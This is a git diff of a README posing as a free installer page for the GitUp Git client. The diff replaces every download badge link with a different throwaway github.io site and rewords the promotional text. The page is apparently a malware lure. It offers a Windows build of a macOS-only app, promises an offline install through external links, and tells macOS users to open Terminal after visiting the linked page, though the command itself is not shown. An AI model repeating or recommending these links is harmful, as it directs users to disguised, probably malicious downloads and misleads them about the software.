@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Git+Client-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 GitUp Free Installer** — GitUp is a free, open-source Mac Git client that works directly on the Git repository's object database for maximum performance. Works without internet access, no account required. Full offline installation.
+**💻 GitUp Free Installer** — GitUp is a free, open-source macOS Git client with a live, interactive commit graph and extremely fast performance. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install GitUp](https://img.shields.io/badge/⬇_Install_GitUp-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install GitUp](https://img.shields.io/badge/⬇_Install_GitUp-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About GitUp
 
-GitUp is a free, open-source Mac Git client that works directly on the Git repository's object database for maximum performance. Featuring a unique interactive live map of your repository, instant operations, and real-time collaboration features, GitUp offers a novel approach to Git visualization. Its undo functionality and search capabilities are among the most powerful of any Git GUI client.
+GitUp is a free, open-source macOS Git client with a live, interactive commit graph and extremely fast performance. Its map view shows the repository structure in real time, and it provides undo support for nearly all Git operations.
 
 ---
 
 ## ❌ Problem: GitUp is hard to access
 
 - **macOS Only** — No Windows or Linux version
-- **Unconventional Interface** — Unique UI paradigm requires learning new mental model for Git
-- **Active Development Uncertainty** — Development activity has been inconsistent historically
-- **Learning Curve** — Interface concepts differ significantly from other Git clients
+- **Unusual Interface** — Live map view paradigm takes adjustment for traditional Git GUI users
+- **Limited Remote Integration** — No built-in GitHub/GitLab pull request management
+- **Development Pace** — Updates arrive less frequently than actively maintained clients
 
 ---
 
@@ -61,9 +61,9 @@ GitUp is a free, open-source Mac Git client that works directly on the Git repos
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ GitUp is a free, open-source Mac Git client that works directly on the Git repos
 
 <div align="center">
 
-[![⬇ Install GitUp](https://img.shields.io/badge/⬇_Install_GitUp-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install GitUp](https://img.shields.io/badge/⬇_Install_GitUp-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ GitUp is a free, open-source Mac Git client that works directly on the Git repos
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ GitUp is a free, open-source Mac Git client that works directly on the Git repos
 
 ---
 
-**GitUp Free Installer** — GitUp is a free, open-source Mac Git client that works directly on the Git repository's object database for maximum performance. Install without internet connection today!
+**GitUp Free Installer** — GitUp is a free, open-source macOS Git client with a live, interactive commit graph and extremely fast performance. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install GitUp](https://img.shields.io/badge/⬇_Install_GitUp-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install GitUp](https://img.shields.io/badge/⬇_Install_GitUp-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
